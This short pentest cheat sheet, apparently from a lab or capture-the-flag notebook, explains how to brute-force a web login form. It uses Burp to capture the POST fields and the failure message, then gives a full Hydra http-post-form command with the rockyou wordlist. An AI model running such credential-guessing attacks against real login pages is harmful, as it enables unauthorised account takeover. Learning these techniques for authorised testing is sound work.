## Password Spraying with Hydra
We need to gather 2 pieces of information:
- POST data (request body specifying the **username** and **password**)
- Error message to help Hydra diffrentiate between successful and failed login.
* * *

1. Run Burp intercept login to the website with an incorrect password
2. Capture the POST data used to send the username and password
eg `fm_usr=user&fm_pwd=1234`
3. Send to website and capture the filed login error message
eg `Login failed. Invalid username or password`
4. Run Hydra with post data and failed erorr message
eg: Login form = **index.php**
`hydra - <user> -P /usr/share/wordlists/rockyou.txt <target_IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
	Note: remove `username or password` from `Login failed. Invalid username or password` to prevent false positives
